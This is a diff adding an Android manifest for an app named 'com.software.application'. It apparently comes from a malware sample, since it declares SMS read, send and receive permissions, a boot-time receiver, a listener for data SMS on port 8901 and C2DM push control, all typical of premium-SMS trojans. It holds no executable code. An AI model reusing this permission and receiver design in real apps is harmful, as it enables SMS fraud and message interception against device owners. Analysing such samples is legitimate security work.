@@ -1,0 +1,52 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.software.application">
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <application android:debuggable="true" android:icon="@drawable/icon" android:label="@string/app_name">
+        <receiver android:name=".Notificator">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <category android:name="android.intent.category.HOME"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name=".Checker">
+            <intent-filter>
+                <action android:name="com.software.CHECKER"/>
+                <category android:name="android.intent.category.HOME"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name=".SmsReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.DATA_SMS_RECEIVED"/>
+                <data android:scheme="sms"/>
+                <data android:port="8901"/>
+            </intent-filter>
+        </receiver>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name=".Main">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <activity android:name=".OffertActivity"/>
+        <activity android:name=".ShowLink"/>
+        <service android:name=".C2DMReceiver"/>
+        <receiver android:name="com.google.android.c2dm.C2DMBroadcastReceiver" android:permission="com.google.android.c2dm.permission.SEND">
+            <intent-filter>
+                <action android:name="com.google.android.c2dm.intent.RECEIVE"/>
+                <category android:name="com.software.application"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="com.google.android.c2dm.intent.REGISTRATION"/>
+                <category android:name="com.software.application"/>
+            </intent-filter>
+        </receiver>
+    </application>
+    <permission android:name="com.software.application.permission.C2D_MESSAGE" android:protectionLevel="signature"/>
+    <uses-permission android:name="com.software.application.permission.C2D_MESSAGE"/>
+    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+</manifest>
